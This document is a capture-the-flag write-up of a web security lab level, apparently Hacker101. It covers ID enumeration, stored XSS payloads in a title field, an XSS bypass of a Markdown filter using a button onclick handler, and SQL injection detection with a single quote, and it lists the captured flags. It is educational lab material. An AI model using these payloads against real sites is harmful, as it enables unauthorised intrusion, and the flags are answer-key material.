## Level 1

This level focuses on multiple common web vulnerabilities:
- ID Enumeration (IDOR-style)
- Stored XSS
- Markdown Filter Bypass
- Basic SQL Injection detection

---

## Flag 1 – ID Enumeration

### Step 1: Inspect Source Code

I opened the page source:

- Right click → **View Page Source**
- Or `Ctrl + U`

Found the following link:

```html
<a href="edit/2">Edit this page</a>
````

---

### Step 2: Manipulate the ID

The URL suggested a numeric identifier:

```
/page/edit/2
```

I changed the ID manually:

```
/page/edit/3
/page/edit/4
```

At:

```
https://90d37bd6fd7f4b5e8602bb3b9628acdc.ctf.hacker101.com/page/edit/4
```

I obtained the flag.

---

### Flag

```
^FLAG^06cc0714b28f39906b14abe0af97fffcbf0e7ad3a807a9112b5dd80e238598e5$FLAG$
```

---

## Flag 2 – Stored XSS (Title Field)

### Step 1: Create New Page

I clicked **"Create a new page"** and noticed:

* Input is reflected in the response

This is a strong indicator of potential **Stored XSS**.

---

### Step 2: Inject Payload

In the page title, I used:

```html
hello<script>alert(1);</script>
```

---

### Step 3: Trigger the Payload

After returning to the homepage, the script executed.

This confirmed a **Stored XSS vulnerability**, and the flag was revealed.

---

### Flag

```
^FLAG^839f75474b068dd6b29bb289621ac5af347427e427d93e500ed0f47532bc9401$FLAG$
```

---

## Flag 3 – Stored XSS via Markdown Bypass

### Observation

* Page body allows **Markdown**
* `<script>` tags are filtered
* Input is still reflected → possible bypass

---

### Step 1: Find a Bypass Payload

After testing multiple payloads, I used:

```html
<button onclick=alert('xss')>click</button>
```

This bypassed the filter and executed successfully.

---

### Step 2: Inspect Source Code

Although no flag appeared visually, I checked the page source and found:

```html
<p><button flag="^FLAG^4303fadfac52308f5adb02cb8f60c40f7ac17ddc613c15296895f358f167d4e1$FLAG$" onclick=alert('xss')>click</button></p>
```

---

### Flag

```
^FLAG^4303fadfac52308f5adb02cb8f60c40f7ac17ddc613c15296895f358f167d4e1$FLAG$
```

---

## Flag 4 – SQL Injection (Detection)

### Observation

While editing pages, I noticed:

```
?id=1
?id=2
```

IDs **3–11 were missing**, which hinted at hidden data.

---

### Step 1: Test for SQL Injection

I added a single quote (`'`) to the parameter:

```
?id=1'
```

This caused a noticeable change in application behavior, indicating improper input handling.

---

### Step 2: Confirm Injection Behavior

This behavior suggests the backend query might look like:

```sql
SELECT * FROM pages WHERE id = '1'
```

Adding `'` breaks the query → classic SQL injection indicator.

---

### Step 3: Retrieve Hidden Data

By experimenting with inputs (e.g., different IDs or crafted payloads), I accessed hidden content and obtained the flag.

---

### Flag

```
^FLAG^2d17e46c28f03b4211c6838344157393e1bb8a75958a4c668dbab75b3e4a5032$FLAG$
```

---

## Key Learnings

* **ID Enumeration** can expose hidden resources
* **Stored XSS** occurs when input is saved and executed later
* Filters (like Markdown) are often **bypassable**
* SQL errors often indicate **injection points**
* Always check:

  * Page source
  * URL parameters
  * Input fields

---

## Tools & Techniques Used

* Browser DevTools (Source + Network)
* Manual URL manipulation
* Payload testing
* Basic XSS payloads
* SQL Injection testing (`'`)

---

## Conclusion

This level demonstrates how multiple vulnerabilities can exist in a single application:

> **Small weaknesses (like poor filtering or predictable IDs) can lead to full compromise.**

Understanding and chaining these issues is key in real-world bug bounty hunting.

